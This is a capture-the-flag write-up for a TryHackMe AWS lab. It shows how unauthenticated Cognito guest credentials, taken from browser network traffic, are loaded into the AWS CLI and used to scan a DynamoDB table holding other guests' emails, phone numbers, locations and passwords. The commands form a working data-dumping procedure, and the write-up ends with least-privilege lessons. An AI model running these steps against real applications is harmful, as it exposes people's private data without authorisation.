# TryHackMe – Complimentary Write-Up
Room Link:https://tryhackme.com/room/hh-complimentary-05e0b604

<img width="1448" height="377" alt="image" src="https://github.com/user-attachments/assets/1346d28a-e50e-4d0b-9fc5-188da45ebf2c" />

# Objective
Investigate how the Byte Lotus Wellness application provides guest access without authentication, identify the AWS service issuing temporary credentials, exploit the IAM misconfiguration, and retrieve the hidden flag from another guest's DynamoDB record.
---

##  Skills Practised

* AWS Cloud Security
* AWS Cognito Identity Pools
* Temporary AWS Credentials (STS)
* IAM Permission Analysis
* DynamoDB Enumeration
* AWS CLI
* Client-Side JavaScript Analysis

---

##  Tools Used

* Browser Developer Tools
* AWS CLI
* AWS STS
* AWS Cognito Identity Pool
* Amazon DynamoDB
* `grep`

---

##  Investigation Steps

### Step 1 – Read the Challenge

The challenge described a wellness application that never asked users to log in, yet it already knew guest information.

The objective was to discover:

1. How the application authenticated users.
2. Where the guest credentials came from.
3. Whether those credentials could access more than one guest's data.

---

### Step 2 – Inspect the Website

I opened the application and inspected it using the browser Developer Tools. The JavaScript revealed that the application was using AWS Cognito Identity Pools to provide guest credentials.

```javascript
const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";

```
<img width="1466" height="927" alt="Screenshot 2026-07-30 at 8 06 51 PM" src="https://github.com/user-attachments/assets/7535aeda-4fc6-4ee3-9674-5229629ab40b" />

This confirmed that every visitor received temporary AWS credentials without having to create an account.
<img width="1448" height="803" alt="image" src="https://github.com/user-attachments/assets/2d27e3dc-becb-457e-80db-6ffbd55f2f1d" />

---

### Step 3 – Capture Temporary AWS Credentials

Using the **Network** tab in Developer Tools, I located the request:

```text
GetCredentialsForIdentity

```

The response contained temporary AWS credentials:

* `AccessKeyId`
* `SecretKey`
* `SessionToken`

These credentials belonged to the unauthenticated Cognito guest role.

---

### Step 4 – Configure AWS CLI

I exported the temporary credentials into my terminal session:

```bash
export AWS_ACCESS_KEY_ID="<AccessKeyId>"
export AWS_SECRET_ACCESS_KEY="<SecretKey>"
export AWS_SESSION_TOKEN="<SessionToken>"
export AWS_DEFAULT_REGION="us-east-1"

```

To verify the credentials:

```bash
aws sts get-caller-identity

```

**Output:**

```json
{
    "UserId": "AROAU2VYTBGY...:CognitoIdentityCredentials",
    "Account": "332173347248",
    "Arn": "arn:aws:sts::332173347248:assumed-role/complimentary-cognito-unauth-role/CognitoIdentityCredentials"
}

```

This confirmed that I was authenticated as the guest IAM role.
<img width="929" height="224" alt="Screenshot 2026-07-31 at 3 35 35 PM" src="https://github.com/user-attachments/assets/82920d1a-8bb1-4dc1-99d7-ccd33d39a650" />

---

### Step 5 – Enumerate Permissions

I first attempted to list all DynamoDB tables:

```bash
aws dynamodb list-tables

```

**Result:**

```text
AccessDeniedException

```

The IAM role did not allow listing tables, indicating that the guest role had restricted permissions.

---

### Step 6 – Analyse the JavaScript

Instead of relying on enumeration tools, I inspected the application's client-side JavaScript.

I discovered:

```javascript
const TABLE_NAME = "complimentary-GuestWellnessProfiles";

```
<img width="912" height="547" alt="image" src="https://github.com/user-attachments/assets/23e2828e-1206-403e-8a76-bfa87dd1548c" />

The application retrieved data using:

```javascript
dynamodb.getItem({
    TableName: TABLE_NAME,
    Key: {
        guest_id: {
            S: guestId()
        }
    }
})

```


This revealed:

* **DynamoDB Table Name:** `complimentary-GuestWellnessProfiles`
* **Partition Key:** `guest_id`
* **AWS Region:** `us-east-1`

---

### Step 7 – Scan the DynamoDB Table

Using the discovered table name, I attempted a full table scan:

```bash
aws dynamodb scan \
    --table-name complimentary-GuestWellnessProfiles

```

The scan succeeded. The response contained records belonging to multiple hotel guests instead of only my own profile.

**Example Record:**

```json
{
    "guest_id": "guest-vibe",
    "email": "vibe@hackerholidays.thm",
    "phone": "+1-555-0193",
    "location": "25.2055,55.2733",
    "password": "digitaldetox2026"
}

```
<img width="929" height="650" alt="Screenshot 2026-07-31 at 3 36 29 PM" src="https://github.com/user-attachments/assets/e16e5f8c-3b74-419f-8387-d6a40f9a7812" />

This confirmed that the guest IAM role could read every item in the table.

---

### Step 8 – Search for the Flag

I saved the scanned output to a local JSON file:

```bash
aws dynamodb scan \
    --table-name complimentary-GuestWellnessProfiles \
    --output json > guests.json

```
<img width="694" height="243" alt="image" src="https://github.com/user-attachments/assets/2d9ebe94-9887-4af4-bb60-69b9b69cac71" />

Then I searched for the flag format:

```bash
grep -R "THM{" guests.json

```
<img width="784" height="46" alt="image" src="https://github.com/user-attachments/assets/581aaea7-ae79-4309-b543-c0bd2a649656" />

---

##  What I Learned

* **AWS Cognito Identity Pools** can issue temporary credentials to unauthenticated users.
* Temporary credentials should always follow the **principle of least privilege**.
* Even when `ListTables` is denied by IAM policies, knowing the exact table name may still allow direct resource operations if table-level permissions are misconfigured.
* Exposing `dynamodb: Scan` to guest or unauthenticated users allows anyone to dump every record in the database.
* Sensitive information (such as credentials or personal user data) should never be accessible to unauthenticated IAM roles.

---

##  Key Takeaways

1. **Client-Side Source Code:** Always inspect client-side JavaScript—it frequently reveals critical cloud resource names, API endpoints, or Identity Pool IDs.
2. **Network Traffic:** Temporary AWS credentials issued via web apps can often be extracted directly from browser network traffic.
3. **IAM Policy Granularity:** IAM permissions dictate actual risk. Misconfigured authorization boundaries can expose sensitive database records even without a traditional application-layer login vulnerability.
4. **Least Privilege Principle:** Strictly restrict permissions assigned to unauthenticated Cognito roles (e.g., limit queries using leading keys or row-level access control via AWS IAM policies).
